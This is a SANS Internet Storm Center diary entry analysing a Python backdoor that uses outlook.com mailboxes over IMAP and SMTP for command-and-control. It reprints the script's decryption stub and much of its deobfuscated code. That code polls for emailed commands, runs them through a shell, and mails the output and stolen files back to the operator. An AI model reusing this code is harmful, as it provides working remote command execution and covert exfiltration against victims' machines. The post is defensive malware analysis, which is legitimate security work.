---
title: C2 Communications Through outlook.com, (Mon, Oct 24th)
url: https://isc.sans.edu/diary/rss/29180
source: SANS Internet Storm Center, InfoCON: green
date: 2022-10-25
fetch_date: 2025-10-03T20:49:33.830652
---

# C2 Communications Through outlook.com, (Mon, Oct 24th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/29176)
* [next](/diary/29182)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [C2 Communications Through outlook.com](/forums/diary/C2%2BCommunications%2BThrough%2Boutlookcom/29180/)

**Published**: 2022-10-24. **Last Updated**: 2022-10-24 07:12:13 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/C2%2BCommunications%2BThrough%2Boutlookcom/29180/#comments)

Most malware implements communication with their C2 server over HTTP(S). Why? Just because it works! But they are multiple ways to implement C2 communications: DNS, P2P, Layer 7 (Twitter), ... Another one that has become less popular with time is SMTP (email communications). I spotted a malicious Python script that exchanges information with its C2 server through emails.

The script in itself is  (more precisely encrypted). The dropper has a VT score of 16/61 (SHA256:a83c2dcfda088cb363e5d5867133b24f5f82e535335642f602b8eb67bd7e3d70)[[1](https://www.virustotal.com/gui/file/a83c2dcfda088cb363e5d5867133b24f5f82e535335642f602b8eb67bd7e3d70/detection)]. By reading the script, you see references to AES and at the end of the script:

```

VVV = AESCipher("vg8G6F8i1JPxCrvsnTWtxp7CjdNLrftI")
S = VVV.decrypt(zlib.decompress(base64.urlsafe_b64decode(S))).encode("rot13")
exec S
```

No need to lose time to decrypt it manually. Just run the Python script in a debugger or print the content of the variable "S" to get access to the payload, which is much more interesting.

The script contains the following variables at the very beginning:

```

VafqEAOmQlHElGIzw = '[email protected]'
epbUrvGOfkujqk = '<redacted>'
nylFCUirD = "smtp-mail[.]outlook[.]com"
dPpyzLwcG = 587
```

The script has an infinite loop that polls the defined mailbox at regular intervals:

```

def gzHOIdWEnqygqLdS ( ) :
   ddtnusC = [ ]
   while True :
      try :
         XWsHvNcaR = IMAP4_SSL ( "imap-mail.outlook.com" )
         XWsHvNcaR . login ( VafqEAOmQlHElGIzw , epbUrvGOfkujqk )
         XWsHvNcaR . select ( "INBOX" )
         sQjVFXwoOFzC , DTDmTVS = XWsHvNcaR . uid ( 'search' , None , '(HEADER Subject "outdoor:")' . format ( qISrvHziKh ) )
         for BdkFBJxWcmsN in DTDmTVS [ 0 ] . split ( ) :
            # logging.debug("[checkJobs] parsing message with uid: {}".format(msg_id))
            klXAxJNtWRqTKo = XWsHvNcaR . uid ( 'fetch' , BdkFBJxWcmsN , '(RFC822)' )
            ntmhhtANAcYXAdOzv = VkcitADCQE ( klXAxJNtWRqTKo )
            mbTyaFBCEqHSz = ntmhhtANAcYXAdOzv . subject . split ( ':' ) [ 2 ]
            if ntmhhtANAcYXAdOzv . dict :
               PUyTWqCvrbwYzfEvXbX = ntmhhtANAcYXAdOzv . dict [ 'CMD' ] . lower ( )
               aXdOFeQxl = ntmhhtANAcYXAdOzv . dict [ 'ARG' ]
               IpXCVOZGEykD = False
               for vcblFHcktLOx in ddtnusC :
                  if vcblFHcktLOx == mbTyaFBCEqHSz :
                     IpXCVOZGEykD = True
               if not IpXCVOZGEykD :
                  if PUyTWqCvrbwYzfEvXbX == 'download' :
                     WYPLOtCfPSBbZQZboq ( mbTyaFBCEqHSz , aXdOFeQxl )
                  elif PUyTWqCvrbwYzfEvXbX == 'cmd' :
                     jvcljzFtWZCyEsRNBmd ( aXdOFeQxl , mbTyaFBCEqHSz )
                  elif PUyTWqCvrbwYzfEvXbX == 'upload' :
                     gImmsvKIAzRJgsrCBhn ( aXdOFeQxl , mbTyaFBCEqHSz )
                  elif PUyTWqCvrbwYzfEvXbX == 'forcecheckin' :
                     DEoRDpUeMQZaOseI ( "Host checking in as requested" , checkin = True )
                  else :
                     raise NotImplementedError
               ddtnusC . append ( mbTyaFBCEqHSz )
         XWsHvNcaR . logout ( )
         sleep ( 30 )
      except Exception as YgQoUrOEf :
         if NJJEtFlTlcAaUTahbT == True : RIoqH ( YgQoUrOEf )
         sleep ( 30 )
```

How does it work? The script opens an IMAPS connection to Microsoft outlook.com, fetches messages from the inbox folder (with the subject "outdoor:"), and parses them through the VkcitADCQE() function. Commands are extracted and saved in a Python dictionary. You can see above that the script supports a limited set of commands. Let's check the "cmd" one. When a "cmd" command is found in a mail, the command is executed:

```

class jvcljzFtWZCyEsRNBmd ( Thread ) :
   def __init__ ( self , command , jobid ) :
      Thread . __init__ ( self )
      self . command = command
      self . jobid = jobid
      self . daemon = True
      self . start ( )
   def run ( self ) :
      try :
         UgCaNpxW = Popen ( self . command , shell = True , stdout = PIPE , stderr = PIPE ,
 stdin = PIPE )
         BOtIz = UgCaNpxW . stdout . read ( )
         BOtIz += UgCaNpxW . stderr . read ( )
         DEoRDpUeMQZaOseI ( { 'CMD' : self . command , 'RES' : BOtIz } , jobid = self . jobid )
      except Exception as YgQoUrOEf :
         if NJJEtFlTlcAaUTahbT == True : RIoqH ( YgQoUrOEf )
         pass
```

Then, the output is sent back (base64 encoded) via email:

```

def DEoRDpUeMQZaOseI ( text , jobid = '' , attachment = [ ] , checkin = False ) :
   JkQBfHzuw = qISrvHziKh
   if jobid :
      JkQBfHzuw = 'imp:{}:{}' . format ( qISrvHziKh , jobid )
   elif checkin :
      JkQBfHzuw = 'checkin:{}' . format ( qISrvHziKh )
   ntmhhtANAcYXAdOzv = MIMEMultipart ( )
   ntmhhtANAcYXAdOzv [ 'From' ] = JkQBfHzuw
   ntmhhtANAcYXAdOzv [ 'To' ] = VafqEAOmQlHElGIzw
   ntmhhtANAcYXAdOzv [ 'Subject' ] = JkQBfHzuw
   emVQcE = { 'FGWINDOW' : "TEST" , 'SYS' : AzBQXZnqkssq ( ) , 'ADMIN' : mSxvRqtvHugevGL ( ) , 'MSG' : text }
   emVQcE = b64encode ( str ( emVQcE ) )
   ntmhhtANAcYXAdOzv . attach ( MIMEText ( str ( emVQcE ) ) )
   for yDXkhJ in attachment :
      if path . exists ( yDXkhJ ) == True :
         MKAjREFQmhwRcGZGB = MIMEBase ( 'application' , 'octet-stream' )
         MKAjREFQmhwRcGZGB . set_payload ( open ( yDXkhJ , 'rb' ) . read ( ) )
         Encoders . encode_base64 ( MKAjREFQmhwRcGZGB )
         MKAjREFQmhwRcGZGB . add_header ( 'Content-Disposition' , 'attachment; filename="{}"' . format ( path . basename ( yDXkhJ ) ) )
         ntmhhtANAcYXAdOzv . attach ( MKAjREFQmhwRcGZGB )
   while True :
      try :
         ADMIMNhFwSGVglla = SMTP ( )
         ADMIMNhFwSGVglla . connect ( nylFCUirD , dPpyzLwcG )
         ADMIMNhFwSGVglla . starttls ( )
         ADMIMNhFwSGVglla . login ( VafqEAOmQlHElGIzw , epbUrvGOfkujqk )
         ADMIMNhFwSGVglla . sendmail ( VafqEAOmQlHElGIzw , VafqEAOmQlHElGIzw , ntmhhtANAcYXAdOzv . as_string ( ) )
         ADMIMNhFwSGVglla . quit ( )
         break
      except Exception as YgQoUrOEf :
         if NJJEtFlTlcAaUTahbT == True : RIoqH ( YgQoUrOEf )
         sleep ( 30 )
```

Unlike HTTP(S), this kind of C2 communication should not work in many cases because IMAPS and SMTP are usually not permitted on corporate networks (you can only use the official email platform). But it remains a very effective way to exfiltrate data. Always the same advice, know your networks(s) and track unusual connections to the Internet.

I tried to monitor the mailbox and to  track some activity, but the credentials did not work. I tried to find more information about the email address; I don't know if it's a fake mailbox or one that has been hijacked. If you have more information, let us know!

[1] <https://www.virustotal.com/gui/file/a83c2dcfda088cb363e5d5867133b24f5f82e535335642f602b8eb67bd7e3d70/detection>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Malware](/tag.html?tag=Malware) [Python](/tag.html?tag=Python) [C2](/tag.html?tag=C2) [SMTP](...